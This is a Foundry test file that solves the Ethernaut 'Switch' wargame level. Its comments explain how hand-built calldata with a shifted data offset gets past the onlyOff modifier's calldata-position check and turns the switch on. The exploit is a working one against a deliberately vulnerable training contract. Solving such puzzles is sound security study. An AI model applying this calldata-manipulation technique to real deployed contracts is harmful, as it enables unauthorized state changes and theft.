// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Switch.sol";

// onlyOff() assumes flipSwitch() is not called with address.call() and calldata follow the usual layout:
// selector 4 bytes, offset 32 bytes, and data length 32 bytes = 68 bytes
// thus, we can build calldata manually and address.call() to circumvent the layout assumption
contract SwitchTest is Test {
    Switch instance;

    function setUp() public {
        instance = new Switch();
    }

    function test() public {
        assertEq(instance.switchOn(), false);

        // 30c13ade: flipSwitch selector
        // 0000000000000000000000000000000000000000000000000000000000000060: customised data offset:
        // this offset 32 bytes, the following padding 32 bytes, and turnSwitchOff.selector 4 bytes
        // 0000000000000000000000000000000000000000000000000000000000000000: padding to fit the 68 bytes offset
        // 20606e15: turnSwitchOff.selector; can also make this a bytes32, just update data offset to 32*3

        // as the offset ends, this is where the input _data starts: (length, data)
        // 0000000000000000000000000000000000000000000000000000000000000004: data length, 4 bytes
        // 76227e1200000000000000000000000000000000000000000000000000000000: turnSwitchOn.selector
        bytes memory data = abi.encodePacked(
            Switch.flipSwitch.selector,
            bytes32(uint256(32 * 2 + 4)),
            bytes32(0),
            Switch.turnSwitchOff.selector,
            bytes32(uint256(4)),
            Switch.turnSwitchOn.selector
        );

        address(instance).call(data);
        assertEq(instance.switchOn(), true);
    }
}
